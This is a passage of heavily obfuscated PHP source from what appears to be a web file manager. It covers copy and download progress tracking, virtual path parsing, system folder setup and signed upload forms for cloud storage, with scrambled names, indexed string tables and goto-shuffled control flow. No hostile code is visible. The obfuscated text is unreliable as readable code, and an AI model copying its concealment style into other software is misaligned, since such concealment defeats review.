´Ã¿î¥[28]]; $this->update(); } public function copyFileStart($d‡° Â, $b•àÁŒèæ, $bŞ£·ë®ä®, $CòÕ¿Üå, $C¥Šù²…¦½, $FÊËÜ©Ü·‚) { goto cÆğƒ¿’»˜; cÆğƒ¿’»˜: $f¶ ÌÁ¼½” =& $_SERVER[Æ]; $dßƒÉ•êåÚ = $C¥Šù²…¦½; if ($dßƒÉ•êåÚ == $GLOBALS[$f¶ ÌÁ¼½”[1490]]) { $dßƒÉ•êåÚ = $GLOBALS[$f¶ ÌÁ¼½”[1491]]; } goto BÛ°›ŸÇº°; BÛ°›ŸÇº°: $GLOBALS[$f¶ ÌÁ¼½”[1491]] = $C¥Šù²…¦½; $GLOBALS[$f¶ ÌÁ¼½”[1490]] = $FÊËÜ©Ü·‚; $FªÈ‚ğˆ© =& $this->task; goto e¢š·ÄÖòÚ; E™Í×ª¼·«: $this->update(); goto cä‡‹Îùœ; e¢š·ÄÖòÚ: $FªÈ‚ğˆ©[$f¶ ÌÁ¼½”[1477]] = $dßƒÉ•êåÚ; $FªÈ‚ğˆ©[$f¶ ÌÁ¼½”[1479]] = (int) $d‡° Â->size($b•àÁŒèæ); $FªÈ‚ğˆ©[$f¶ ÌÁ¼½”[1480]] = 0; goto bª•Ò˜ËÆš; bª•Ò˜ËÆš: $FªÈ‚ğˆ©[$f¶ ÌÁ¼½”[979]] = $f¶ ÌÁ¼½”[33]; $FªÈ‚ğˆ©[$f¶ ÌÁ¼½”[1481]] = $f¶ ÌÁ¼½”[33]; $FªÈ‚ğˆ©[$f¶ ÌÁ¼½”[1482]] = 0; goto E™Í×ª¼·«; cä‡‹Îùœ: } public function copyFileEnd($cÔ‘šŠñ…Â, $eŸñ®œâÂ, $FÁ‡¤Æ‰£à, $D×ªÁµ˜Ú, $d Í‰ñ¤¦Î, $FÍˆ¬º²ï) { $EƒÚá‰È¸¶ =& $_SERVER[Æ]; $a–•ÛŞª”À =& $this->task; $a–•ÛŞª”À[$EƒÚá‰È¸¶[1480]] = $a–•ÛŞª”À[$EƒÚá‰È¸¶[1479]]; $a–•ÛŞª”À[$EƒÚá‰È¸¶[1481]] = $EƒÚá‰È¸¶[33]; if ($d Í‰ñ¤¦Î == $a–•ÛŞª”À[$EƒÚá‰È¸¶[1477]]) { $a–•ÛŞª”À[$EƒÚá‰È¸¶[1483]] += $a–•ÛŞª”À[$EƒÚá‰È¸¶[1479]]; $a–•ÛŞª”À[$EƒÚá‰È¸¶[1484]] = $a–•ÛŞª”À[$EƒÚá‰È¸¶[1483]]; $this->update(1); } else { $this->update(); $a–•ÛŞª”À[$EƒÚá‰È¸¶[1480]] = 0; } self::log($EƒÚá‰È¸¶[1492] . $eŸñ®œâÂ . $EƒÚá‰È¸¶[66] . $D×ªÁµ˜Ú . $EƒÚá‰È¸¶[217] . $d Í‰ñ¤¦Î . $EƒÚá‰È¸¶[1493] . $a–•ÛŞª”À[$EƒÚá‰È¸¶[1477]]); } public function updateFileEnd($bÂÇÀ™ŠîÊ, $CÜÄã¦ğÇ) { goto f‚¶°¾İõ¯; CÉ§óåË³: $cáÎ°Øæ[$aÃ«±İ—çº[1479]] = $CÜÄã¦ğÇ; $cáÎ°Øæ[$aÃ«±İ—çº[1483]] += $CÜÄã¦ğÇ; $cáÎ°Øæ[$aÃ«±İ—çº[1484]] = $cáÎ°Øæ[$aÃ«±İ—çº[1483]]; goto b‰ôŒ›İ¦½; f‚¶°¾İõ¯: $aÃ«±İ—çº =& $_SERVER[Æ]; $cáÎ°Øæ =& $this->task; $cáÎ°Øæ[$aÃ«±İ—çº[1477]] = $bÂÇÀ™ŠîÊ; goto CÉ§óåË³; b‰ôŒ›İ¦½: $this->update(1); self::log($aÃ«±İ—çº[1494] . $bÂÇÀ™ŠîÊ); goto C­äœ¤ÂƒË; C­äœ¤ÂƒË: } public function sourceModelCopy($AªÚ¥¬°ö) { goto EŒÊèÀ‚Œç; eÜÃ×ğê: switch ($FÇÌ¢å¯°â) { case $Aº®ãÉ«Ø¼[507]: $DÊ»½‡ğºå = 1; break; case $Aº®ãÉ«Ø¼[510]: $D­Õ£ëøğÑ[$Aº®ãÉ«Ø¼[1477]] = $e®Øâ™Û†Ò[$Aº®ãÉ«Ø¼[28]]; break; case $Aº®ãÉ«Ø¼[512]: $DÊ»½‡ğºå = intval($AªÚ¥¬°ö[$Aº®ãÉ«Ø¼[363]] * 0.4); break; case $Aº®ãÉ«Ø¼[514]: $DÊ»½‡ğºå = intval($AªÚ¥¬°ö[$Aº®ãÉ«Ø¼[363]] * 0.2); break; case $Aº®ãÉ«Ø¼[516]: $DÊ»½‡ğºå = intval($AªÚ¥¬°ö[$Aº®ãÉ«Ø¼[363]] * 0.4); break; } $this->update($DÊ»½‡ğºå); $this->sourceModelCopyFlag = !1; goto cÈØ¦Ãªø—; EŒÊèÀ‚Œç: $Aº®ãÉ«Ø¼ =& $_SERVER[Æ]; $FÇÌ¢å¯°â = $AªÚ¥¬°ö[0]; $e®Øâ™Û†Ò = $AªÚ¥¬°ö[1]; goto bîœ‹ˆÒ•ò; bîœ‹ˆÒ•ò: $D­Õ£ëøğÑ =& $this->task; $this->sourceModelCopyFlag = !0; $DÊ»½‡ğºå = 0; goto eÜÃ×ğê; cÈØ¦Ãªø—: } public function sourceRemove($eĞ¹ò¢ÌÖĞ, $Bš’õ–ÄÍ) { $a—‘½½¼¥Á =& $_SERVER[Æ]; $this->sourceModelCopyFlag = !0; $C²Ó©Ğéòª = 1; if (isset($eĞ¹ò¢ÌÖĞ[$a—‘½½¼¥Á[80]])) { $C²Ó©Ğéòª = $eĞ¹ò¢ÌÖĞ[$a—‘½½¼¥Á[80]][$a—‘½½¼¥Á[78]] + $eĞ¹ò¢ÌÖĞ[$a—‘½½¼¥Á[80]][$a—‘½½¼¥Á[79]] + 1; } $this->update($C²Ó©Ğéòª); $this->sourceModelCopyFlag = !1; } public function sourceMove($Eö¥ŸäÚë‘) { $this->sourceRemove($Eö¥ŸäÚë‘, !1); } public function curlProgress($e”Ë¯¨Ï‰, $aƒĞŸÉÌ©Å, $bª†ö‰ò…, $b†ª¶ãƒÍ, $b«Á«ò‰ÒÉ) { $C†¡ÓòŒ½ß =& $_SERVER[Æ]; $AØãà·¼¥ =& $this->task; if ($b«Á«ò‰ÒÉ > 0) { $AØãà·¼¥[$C†¡ÓòŒ½ß[979]] = $C†¡ÓòŒ½ß[1495]; $AØãà·¼¥[$C†¡ÓòŒ½ß[1481]] = $C†¡ÓòŒ½ß[103]; if ($AØãà·¼¥[$C†¡ÓòŒ½ß[1479]] == $b†ª¶ãƒÍ || $b†ª¶ãƒÍ > 1024 * 1024) { $AØãà·¼¥[$C†¡ÓòŒ½ß[1480]] = $b«Á«ò‰ÒÉ; } if ($AØãà·¼¥[$C†¡ÓòŒ½ß[1482]]) { $AØãà·¼¥[$C†¡ÓòŒ½ß[1480]] = $b«Á«ò‰ÒÉ + $AØãà·¼¥[$C†¡ÓòŒ½ß[1482]]; } } else { if ($bª†ö‰ò… > 0) { if ($AØãà·¼¥[$C†¡ÓòŒ½ß[1479]] == $aƒĞŸÉÌ©Å) { $AØãà·¼¥[$C†¡ÓòŒ½ß[1480]] = $bª†ö‰ò…; $AØãà·¼¥[$C†¡ÓòŒ½ß[979]] = $C†¡ÓòŒ½ß[1496]; $AØãà·¼¥[$C†¡ÓòŒ½ß[1481]] = $C†¡ÓòŒ½ß[1040]; } } } $this->update(); } public function curlProgressStart($E‹ÒÕ“–ÁÉ) { } public function curlProgressEnd($FÓÆŒ£÷—) { $bëÙŒîô³§ =& $_SERVER[Æ]; $E‘•²Ëİ²„ =& $this->task; $FÁ©–ÉÜö½ = curl_getinfo($FÓÆŒ£÷—); $E…†‹ÚÌÜİ = $FÁ©–ÉÜö½[$bëÙŒîô³§[1497]]; if ($E‘•²Ëİ²„[$bëÙŒîô³§[1481]] == $bëÙŒîô³§[103] && $E…†‹ÚÌÜİ) { $E‘•²Ëİ²„[$bëÙŒîô³§[1482]] += $E…†‹ÚÌÜİ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $fø‰êÌ’‹¼ =& $_SERVER[Æ]; $BÂÍùõÀöŠ =& $this->task; $BÂÍùõÀöŠ[$fø‰êÌ’‹¼[1498]] = 1; Hook::bind($fø‰êÌ’‹¼[1471], array($this, $fø‰êÌ’‹¼[1499])); Hook::bind($fø‰êÌ’‹¼[1473], array($this, $fø‰êÌ’‹¼[1500])); Hook::bind($fø‰êÌ’‹¼[1475], array($this, $fø‰êÌ’‹¼[1501])); } protected function endAfter() { $dÎ‚³‰‹öÁ =& $_SERVER[Æ]; Hook::unbind($dÎ‚³‰‹öÁ[1471], array($this, $dÎ‚³‰‹öÁ[1499])); Hook::unbind($dÎ‚³‰‹öÁ[1473], array($this, $dÎ‚³‰‹öÁ[1500])); Hook::unbind($dÎ‚³‰‹öÁ[1475], array($this, $dÎ‚³‰‹öÁ[1501])); } public function progressStart($CÓ‹„²òË) { $BŠ›‚µŒí™ =& $_SERVER[Æ]; $fã §†ï¢Œ = curl_getinfo($CÓ‹„²òË); self::log($BŠ›‚µŒí™[1502] . $fã §†ï¢Œ[$BŠ›‚µŒí™[295]]); self::valueSet($this->task[$BŠ›‚µŒí™[367]], $this->task); } public function progressEnd($fÏë´¥†) { $A‡ÇÙ›ØµŞ =& $_SERVER[Æ]; self::log($A‡ÇÙ›ØµŞ[1503] . $this->task[$A‡ÇÙ›ØµŞ[367]]); $this->end(); } public function progress($DĞÇËŸ½ÇÛ, $B … Îåé¯, $B‰½ø´¯Å—, $fíëóŒ‰ÕÒ, $bñÊÖ÷«ÜÕ) { $f­ï‘ËŠ´î =& $_SERVER[Æ]; $BÖ¯Õ”ŸğÜ =& $this->task; if ($bñÊÖ÷«ÜÕ > 0) { $BÖ¯Õ”ŸğÜ[$f­ï‘ËŠ´î[977]] = $BÖ¯Õ”ŸğÜ[$f­ï‘ËŠ´î[977]] == 0 ? $fíëóŒ‰ÕÒ : $BÖ¯Õ”ŸğÜ[$f­ï‘ËŠ´î[977]]; $BÖ¯Õ”ŸğÜ[$f­ï‘ËŠ´î[989]] = $bñÊÖ÷«ÜÕ; } else { if ($B‰½ø´¯Å— > 0) { $BÖ¯Õ”ŸğÜ[$f­ï‘ËŠ´î[977]] = $BÖ¯Õ”ŸğÜ[$f­ï‘ËŠ´î[977]] == 0 ? $B … Îåé¯ : $BÖ¯Õ”ŸğÜ[$f­ï‘ËŠ´î[977]]; $BÖ¯Õ”ŸğÜ[$f­ï‘ËŠ´î[989]] = $B‰½ø´¯Å—; } } $this->update(); self::log("\x70\162\x6f\x67\x72\145\x73\x73\110\x74\x74\160\x3a\144\x6f\x77\x6e\x3a{$B‰½ø´¯Å—}\x2f{$B … Îåé¯}\x3b\x20\x75\160\x6c\x6f\141\x64\x3a{$bñÊÖ÷«ÜÕ}\x2f{$fíëóŒ‰ÕÒ}\x3b"); } } goto EŞºÃß“…; C˜ßˆÔå•š: class KodIO { const KOD_SOURCE = "\173\x73\157\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\x72\x52\x65\x63\171\143\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\162\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\162\x46\151\x6c\145\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\x72\106\151\154\x65\x54\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\x70\x52\x6f\x6f\x74\123\145\154\x66\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\x72\x53\x68\x61\162\x65\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\x65\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\162\145\x49\x74\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\x72\145\111\x74\x65\x6d\x4c\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\162\143\150\x7d"; const KOD_BLOCK = "\173\142\154\157\143\x6b\x7d"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\163\x65\x72\x52\x65\156\x63\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\x65\x72\x7d"; public static function typeList() { $BËÃ¥›Ò =& $_SERVER[Æ]; return array($BËÃ¥›Ò[1050] => self::KOD_SOURCE, $BËÃ¥›Ò[1051] => self::KOD_USER_RECYCLE, $BËÃ¥›Ò[1052] => self::KOD_USER_FAV, $BËÃ¥›Ò[1053] => self::KOD_USER_FILE_TAG, $BËÃ¥›Ò[1054] => self::KOD_USER_FILE_TYPE, $BËÃ¥›Ò[1055] => self::KOD_GROUP_ROOT_SELF, $BËÃ¥›Ò[1056] => self::KOD_USER_SHARE, $BËÃ¥›Ò[1057] => self::KOD_USER_SHARE_LINK, $BËÃ¥›Ò[1058] => self::KOD_USER_SHARE_TO_ME, $BËÃ¥›Ò[1059] => self::KOD_SHARE_ITEM, $BËÃ¥›Ò[1060] => self::KOD_SHARE_LINK, $BËÃ¥›Ò[1061] => self::KOD_SEARCH, $BËÃ¥›Ò[1062] => self::KOD_BLOCK, $BËÃ¥›Ò[1063] => self::KOD_IO, $BËÃ¥›Ò[1064] => self::KOD_USER_RECENT, $BËÃ¥›Ò[1065] => self::KOD_USER_DRIVER); } public static function parse($Dˆ©¶Ç‘·) { goto AŠø‘Åé‘; bˆø‡Â¡é‹: $fÑ‚‚Ó = array($F­–Ä‹’‰¨[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $b…¯ºòÊâ[$F­–Ä‹’‰¨[1070]] = in_array($b…¯ºòÊâ[$F­–Ä‹’‰¨[29]], $fÑ‚‚Ó); return $b…¯ºòÊâ; goto a¬’¨Ä÷¾õ; AŠø‘Åé‘: $F­–Ä‹’‰¨ =& $_SERVER[Æ]; $Dˆ©¶Ç‘· = self::clear($Dˆ©¶Ç‘·); $AÒëò®Óİ = array_values(self::typeList()); goto a¹Ó»É±µ„; a¹Ó»É±µ„: preg_match($F­–Ä‹’‰¨[1066], $Dˆ©¶Ç‘·, $fØ”¶ËÎ„›); $b…¯ºòÊâ = array($F­–Ä‹’‰¨[388] => !1, $F­–Ä‹’‰¨[1067] => !1, $F­–Ä‹’‰¨[385] => !1, $F­–Ä‹’‰¨[75] => $Dˆ©¶Ç‘·, $F­–Ä‹’‰¨[1012] => !1, $F­–Ä‹’‰¨[1011] => $F­–Ä‹’‰¨[33]); if (is_array($fØ”¶ËÎ„›) && count($fØ”¶ËÎ„›) == 5) { $B¢™†¹ = $F­–Ä‹’‰¨[1068] . $fØ”¶ËÎ„›[2] . $F­–Ä‹’‰¨[315]; if (in_array($B¢™†¹, $AÒëò®Óİ)) { $b…¯ºòÊâ[$F­–Ä‹’‰¨[1012]] = $fØ”¶ËÎ„›[1]; $b…¯ºòÊâ[$F­–Ä‹’‰¨[29]] = $B¢™†¹; $b…¯ºòÊâ[$F­–Ä‹’‰¨[1069]] = substr($B¢™†¹, 1, -1); $b…¯ºòÊâ[$F­–Ä‹’‰¨[367]] = $fØ”¶ËÎ„›[3]; } $b…¯ºòÊâ[$F­–Ä‹’‰¨[1011]] = $fØ”¶ËÎ„›[4]; } goto bˆø‡Â¡é‹; a¬’¨Ä÷¾õ: } public static function clear($a“„áõ¸åà) { goto B¹ø£¹²Œ²; C¹ïëÂ»²†: $a“„áõ¸åà = preg_replace($FÃ‰ìÜó“È[1073], $FÃ‰ìÜó“È[8], $a“„áõ¸åà); if ($a“„áõ¸åà == $FÃ‰ìÜó“È[8]) { return $FÃ‰ìÜó“È[8]; } $a“„áõ¸åà = rtrim($a“„áõ¸åà, $FÃ‰ìÜó“È[8]); goto EÂ“³Ÿ‰Û; eßØòÆÇÚß: $f’öË¢—¯ = $FÃ‰ìÜó“È[1071]; if (substr($a“„áõ¸åà, 0, 3) == $FÃ‰ìÜó“È[1072]) { $a“„áõ¸åà = substr($a“„áõ¸åà, 3); } while (strstr($a“„áõ¸åà, $f’öË¢—¯)) { $a“„áõ¸åà = str_replace($f’öË¢—¯, $FÃ‰ìÜó“È[8], $a“„áõ¸åà); } goto C¹ïëÂ»²†; EÂ“³Ÿ‰Û: return $a“„áõ¸åà; goto f¨‘ÀšŠ¹¦; B¹ø£¹²Œ²: $FÃ‰ìÜó“È =& $_SERVER[Æ]; $a“„áõ¸åà = str_replace(array($FÃ‰ìÜó“È[991], $FÃ‰ìÜó“È[217]), $FÃ‰ìÜó“È[50], $a“„áõ¸åà); $a“„áõ¸åà = str_replace($FÃ‰ìÜó“È[93], $FÃ‰ìÜó“È[8], $a“„áõ¸åà); goto eßØòÆÇÚß; f¨‘ÀšŠ¹¦: } public static function sourceID($EˆâŸÂõğ) { $aÉ‰ÑŠÈÃİ =& $_SERVER[Æ]; $c‘ŒÓé½ = self::parse($EˆâŸÂõğ); if ($c‘ŒÓé½[$aÉ‰ÑŠÈÃİ[29]] !== self::KOD_SOURCE) { show_json(LNG($aÉ‰ÑŠÈÃİ[1074]), !1); } return $c‘ŒÓé½[$aÉ‰ÑŠÈÃİ[367]]; } public static function make($E÷¶¨¯’æ¼) { if (!$E÷¶¨¯’æ¼) { return !1; } return self::makePath(self::KOD_SOURCE, intval($E÷¶¨¯’æ¼)); } public static function makeShare($a‚Õ©Şå“, $cˆÓ¡ßÚ«) { return self::makePath(self::KOD_SHARE_ITEM, $a‚Õ©Şå“, $cˆÓ¡ßÚ«); } public static function makeFileTypePath($cš¤ÜÌÛ) { return self::makePath(self::KOD_USER_FILE_TYPE, $cš¤ÜÌÛ); } public static function makeFileTagPath($B´¤Ú·×) { return self::makePath(self::KOD_USER_FILE_TAG, $B´¤Ú·×); } public static function makePath($cÊøôğˆ¸÷, $e‰Ø¡Šáè‘ = '', $bå„ñˆàÕô = '') { $DÑ©Õ²© =& $_SERVER[Æ]; $AŸàŒ¬Ó×‘ = substr($cÊøôğˆ¸÷, 1, -1); $e¯Ìêøµ¶ = $DÑ©Õ²©[1075] . $AŸàŒ¬Ó×‘ . $DÑ©Õ²©[1076] . $e‰Ø¡Šáè‘ . $DÑ©Õ²©[1077]; $e¯Ìêøµ¶ = $bå„ñˆàÕô ? $e¯Ìêøµ¶ . $bå„ñˆàÕô . $DÑ©Õ²©[8] : $e¯Ìêøµ¶; return $e¯Ìêøµ¶; } public static function hashPath($bµ¥Ø‡ËÑ’) { $cĞš¥’•¨Û =& $_SERVER[Æ]; $fà’ß¿‚˜„ = is_array($bµ¥Ø‡ËÑ’) ? $bµ¥Ø‡ËÑ’ : IO::info($bµ¥Ø‡ËÑ’); $D¿ Ò£İÔ‘ = _get($fà’ß¿‚˜„, $cĞš¥’•¨Û[1078], $cĞš¥’•¨Û[33]); if (!$D¿ Ò£İÔ‘) { $f¶¬£‚Ë = KodIO::parse($fà’ß¿‚˜„[$cĞš¥’•¨Û[75]]); if (!$f¶¬£‚Ë[$cĞš¥’•¨Û[29]]) { $D¿ Ò£İÔ‘ = IO::hashSimple($fà’ß¿‚˜„[$cĞš¥’•¨Û[75]]); } } if (!$D¿ Ò£İÔ‘) { $D¿ Ò£İÔ‘ = md5($fà’ß¿‚˜„[$cĞš¥’•¨Û[75]] . $fà’ß¿‚˜„[$cĞš¥’•¨Û[77]] . $fà’ß¿‚˜„[$cĞš¥’•¨Û[107]]); } return $D¿ Ò£İÔ‘; } public static function initSystemPath() { $c¨‰†ÁÀİí =& $_SERVER[Æ]; if (defined($c¨‰†ÁÀİí[1079])) { return; } define($c¨‰†ÁÀİí[1079], self::systemPath($c¨‰†ÁÀİí[1080])); define($c¨‰†ÁÀİí[1081], self::systemPath($c¨‰†ÁÀİí[1082])); define($c¨‰†ÁÀİí[1083], self::systemPath($c¨‰†ÁÀİí[1084])); define($c¨‰†ÁÀİí[1085], self::systemPath($c¨‰†ÁÀİí[1086])); } private static function systemPath($eÊÌ½¸±Ò°) { goto d¬»–É”Â´; d¬»–É”Â´: $F›Á·ŒäÚø =& $_SERVER[Æ]; $Dƒæ®…È×¶ = $F›Á·ŒäÚø[1087] . ucfirst($eÊÌ½¸±Ò°); $Aí•Šô´Ò“ = Model($F›Á·ŒäÚø[1088])->get($Dƒæ®…È×¶); goto b¶ÎêƒŞğ; bˆ˜É­áˆ: return $Aí•Šô´Ò“; goto A¦Şµ¹î’‡; b¶ÎêƒŞğ: if ($Aí•Šô´Ò“) { return $Aí•Šô´Ò“; } if ($eÊÌ½¸±Ò° == $F›Á·ŒäÚø[1080]) { $Aí•Šô´Ò“ = self::make(Model($F›Á·ŒäÚø[751])->systemRootPathAdd($F›Á·ŒäÚø[1089])); } else { $Aí•Šô´Ò“ = self::systemPath($F›Á·ŒäÚø[1080]); $fÃÅ’°ïÒ” = self::sourceID($Aí•Šô´Ò“); $Aí•Šô´Ò“ = self::make(Model($F›Á·ŒäÚø[751])->mkdir($fÃÅ’°ïÒ”, $eÊÌ½¸±Ò°)); } Model($F›Á·ŒäÚø[1088])->set($Dƒæ®…È×¶, $Aí•Šô´Ò“); goto bˆ˜É­áˆ; A¦Şµ¹î’‡: } public static function systemFolder($Aƒˆ¿•«å) { $bÖ¶‹ÛÊâ‘ = IO_PATH_SYSTEM_SOURCE . $Aƒˆ¿•«å; $BˆâÑã‘ô÷ = Cache::get($bÖ¶‹ÛÊâ‘); if (!$BˆâÑã‘ô÷) { $A‡›¦á—¨é = IO::infoFull($bÖ¶‹ÛÊâ‘); if (!$A‡›¦á—¨é) { $BˆâÑã‘ô÷ = IO::mkdir($bÖ¶‹ÛÊâ‘, REPEAT_SKIP); } else { $BˆâÑã‘ô÷ = $A‡›¦á—¨é[$_SERVER[Æ][75]]; } Cache::set($bÖ¶‹ÛÊâ‘, $BˆâÑã‘ô÷, 3600 * 10); } return $BˆâÑã‘ô÷; } public static function defaultDriver() { return Model($_SERVER[Æ][702])->defaultDriver(); } public static function defaultIO() { $Fèš¨‰ª–— =& $_SERVER[Æ]; $BâŠ¾Õ» § = self::defaultDriver(); return $Fèš¨‰ª–—[1090] . $BâŠ¾Õ» §[$Fèš¨‰ª–—[367]] . $Fèš¨‰ª–—[1077]; } public static function defaultDriverInit() { static $DÚøÛ‰»¦Ù = false; if ($DÚøÛ‰»¦Ù) { return $DÚøÛ‰»¦Ù; } $DÚøÛ‰»¦Ù = IO::init(self::defaultIO()); return $DÚøÛ‰»¦Ù; } public static function fileTypeList() { $d†õÇ¦Œ’ó =& $_SERVER[Æ]; $c¸¼ñ¤ÜÍ = $GLOBALS[$d†õÇ¦Œ’ó[6]][$d†õÇ¦Œ’ó[1091]]; foreach ($c¸¼ñ¤ÜÍ as $A¶éÌõÊ‡Ş => $F¦Ó ¥ÔŒŸ) { $AÃ™ßÀ¼‰ = $d†õÇ¦Œ’ó[1092] . $A¶éÌõÊ‡Ş; $CªÍŞì”ç = LNG($AÃ™ßÀ¼‰); if ($AÃ™ßÀ¼‰ != $CªÍŞì”ç) { $c¸¼ñ¤ÜÍ[$A¶éÌõÊ‡Ş][$d†õÇ¦Œ’ó[28]] = $CªÍŞì”ç; } } return $c¸¼ñ¤ÜÍ; } public static function transferType($døÔÂåá¡¦, $eçƒéÔ¯‹´) { goto b£öìğ¶Í; b£öìğ¶Í: $CËó«Ù¸¶³ =& $_SERVER[Æ]; $bç²ŸØÆë¸ = self::driverType($døÔÂåá¡¦); $b·ÆŠÏà¸ = self::driverType($eçƒéÔ¯‹´); goto cŠ“›Â…è; aÊ–’ß ™³: return $CËó«Ù¸¶³[1095]; goto b èÙç‡ØÍ; cŠ“›Â…è: if ($bç²ŸØÆë¸[$CËó«Ù¸¶³[29]] == $b·ÆŠÏà¸[$CËó«Ù¸¶³[29]] && $bç²ŸØÆë¸[$CËó«Ù¸¶³[1093]] == $b·ÆŠÏà¸[$CËó«Ù¸¶³[1093]]) { return $CËó«Ù¸¶³[1094]; } if ($bç²ŸØÆë¸[$CËó«Ù¸¶³[29]] == $CËó«Ù¸¶³[777] && $b·ÆŠÏà¸[$CËó«Ù¸¶³[29]] == $CËó«Ù¸¶³[102]) { return $CËó«Ù¸¶³[1040]; } if ($bç²ŸØÆë¸[$CËó«Ù¸¶³[29]] == $CËó«Ù¸¶³[102] && $b·ÆŠÏà¸[$CËó«Ù¸¶³[29]] == $CËó«Ù¸¶³[777]) { return $CËó«Ù¸¶³[103]; } goto aÊ–’ß ™³; b èÙç‡ØÍ: } public static function driverType($c°£¦®¢ÕÈ) { goto B£§ËÆ¯´; A ‘ÈóÙ‡‹: return array($bô§§æá˜[29] => $bô§§æá˜[777], $bô§§æá˜[1093] => $c°£¦®¢ÕÈ->pathDriver, $bô§§æá˜[75] => $a½¸²¦óíÑ); goto Aİõ·‚òˆª; fÈÖÚîŠ™¢: if ($B±¸ÉŠ‰—™ == $bô§§æá˜[692] || $B±¸ÉŠ‰—™ == $bô§§æá˜[1097] || $B±¸ÉŠ‰—™ == $bô§§æá˜[1098]) { $c°£¦®¢ÕÈ = self::defaultDriverInit(); } else { if ($B±¸ÉŠ‰—™ == $bô§§æá˜[1048] || $B±¸ÉŠ‰—™ == $bô§§æá˜[1099]) { $c°£¦®¢ÕÈ = IO::init($c°£¦®¢ÕÈ->pathParse[$bô§§æá˜[998]]); } } $B±¸ÉŠ‰—™ = str_replace($bô§§æá˜[1096], $bô§§æá˜[33], strtolower($c°£¦®¢ÕÈ->getType())); if ($B±¸ÉŠ‰—™ == $bô§§æá˜[102]) { return array($bô§§æá˜[29] => $bô§§æá˜[102], $bô§§æá˜[1093] => $bô§§æá˜[33], $bô§§æá˜[75] => $a½¸²¦óíÑ); } goto A ‘ÈóÙ‡‹; B£§ËÆ¯´: $bô§§æá˜ =& $_SERVER[Æ]; $a½¸²¦óíÑ = $c°£¦®¢ÕÈ->path; $B±¸ÉŠ‰—™ = str_replace($bô§§æá˜[1096], $bô§§æá˜[33], strtolower($c°£¦®¢ÕÈ->getType())); goto fÈÖÚîŠ™¢; Aİõ·‚òˆª: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($CÀ¤®ÊÂ®¯) { parent::__construct($CÀ¤®ÊÂ®¯); $this->signatureVersion($_SERVER[Æ][200]); } public function uploadFormData($E±„ë‹×‘ë, $bÅÒ¾Æå´Œ = 3600) { goto f²ËÚÕâ; AÕ©¤˜İéî: $DéÆĞŠò÷Ô = array($C‚ó‡ºãœ[1102] => $b‚Ùòî“„É, $C‚ó‡ºãœ[1103] => array(array($C‚ó‡ºãœ[1104] => $D˜¦äÜß„Ş), array($C‚ó‡ºãœ[1105] => $this->bucket), array($C‚ó‡ºãœ[1106], $C‚ó‡ºãœ[1107], $C‚ó‡ºãœ[33]), array($C‚ó‡ºãœ[1108] => $D—ÅÌ¶ë˜í), array($C‚ó‡ºãœ[1109] => $f†Ø¢­áØ), array($C‚ó‡ºãœ[1110] => $this->accessKey), array($C‚ó‡ºãœ[1111] => $cµçäÛ‹¸ì))); $DéÆĞŠò÷Ô = json_encode($DéÆĞŠò÷Ô); $Bª’¨Äòºò = hash_hmac($C‚ó‡ºãœ[218], $cµçäÛ‹¸ì, $this->secret); goto E«ã¥Á—ãê; f²ËÚÕâ: $C‚ó‡ºãœ =& $_SERVER[Æ]; $D˜¦äÜß„Ş = $C‚ó‡ºãœ[185]; $f†Ø¢­áØ = $C‚ó‡ºãœ[218]; goto BäÌø¢©‹; E«ã¥Á—ãê: $Aí‚“¯ÁŒã = sha1($DéÆĞŠò÷Ô); $d»»Ÿ¾Ø¾à = hash_hmac($C‚ó‡ºãœ[218], $Aí‚“¯ÁŒã, $Bª’¨Äòºò); $E—ÛÆÏöİ = array($C‚ó‡ºãœ[1104] => $D˜¦äÜß„Ş, $C‚ó‡ºãœ[1108] => $D—ÅÌ¶ë˜í, $C‚ó‡ºãœ[1112] => base64_encode($DéÆĞŠò÷Ô), $C‚ó‡ºãœ[1109] => $f†Ø¢­áØ, $C‚ó‡ºãœ[1110] => $this->accessKey, $C‚ó‡ºãœ[1113] => $cµçäÛ‹¸ì, $C‚ó‡ºãœ[1114] => $d»»Ÿ¾Ø¾à, $C‚ó‡ºãœ[169] => $this->getHost()); goto d¤ô†«Çá; BäÌø¢©‹: $D—ÅÌ¶ë˜í = $C‚ó‡ºãœ[1100]; $b‚Ùòî“„É = gmdate($C‚ó‡ºãœ[1101], time() + $bÅÒ¾Æå´Œ); $cµçäÛ‹¸ì = (string) time() . $C‚ó‡ºãœ[67] . (string) (time() + $bÅÒ¾Æå´Œ); goto AÕ©¤˜İéî; d¤ô†«Çá: return $E—ÛÆÏöİ; goto A¨±Æ•ÏË“; A¨±Æ•ÏË“: } public function fileOutLink($E¤‚ÅÛï) { $fŒŠ±ÃÒ =& $_SERVER[Æ]; if (substr($E¤‚ÅÛï, 0, 7) == $fŒŠ±ÃÒ[1115]) { $E¤‚ÅÛï = $fŒŠ±ÃÒ[1116] . substr($E¤‚ÅÛï, 7); } header($fŒŠ±ÃÒ[156] . $E¤‚ÅÛï); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($dÖ‰ç­’£á) { $this->pathParse = $dÖ‰ç­’£á; $this->model = Model($_SERVER[Æ][1117]); } public function getPath($Aä‰à—¯Åœ) { return trim($Aä‰à—¯Åœ, $_SERVER[Æ][8]); } public function pathFather($B §×°¬) { $C¯òØß¾¯Í = $this->parse($B §×°¬); $C¯òØß¾¯Í = $this->infoSimple($B §×°¬); return $C¯òØß¾¯Í ? 